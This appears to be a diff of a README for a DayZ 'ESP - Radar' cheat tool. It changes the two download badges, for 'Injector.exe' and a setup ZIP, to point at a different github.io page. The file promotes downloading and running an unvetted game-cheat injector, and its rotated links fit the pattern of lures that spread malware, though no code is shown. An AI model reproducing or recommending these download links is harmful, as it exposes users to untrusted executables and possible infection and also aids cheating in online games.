@@ -1,7 +1,7 @@
 # 🧠 DayZ ESP - Radar — Full Setup Tool
 
-[![Download Injector.exe](https://img.shields.io/badge/Download-Injector.exe-green?style=for-the-badge)](https://dayz-esp-radar-full-setup-tool.github.io/.github/)
-[![Get Full Package](https://img.shields.io/badge/Get_Setup_Files-ZIP-blue?style=for-the-badge)](https://dayz-esp-radar-full-setup-tool.github.io/.github/)
+[![Download Injector.exe](https://img.shields.io/badge/Download-Injector.exe-green?style=for-the-badge)](https://davis0056601.github.io/.github/dayz-esp-radar)
+[![Get Full Package](https://img.shields.io/badge/Get_Setup_Files-ZIP-blue?style=for-the-badge)](https://davis0056601.github.io/.github/dayz-esp-radar)
 
 ---
 
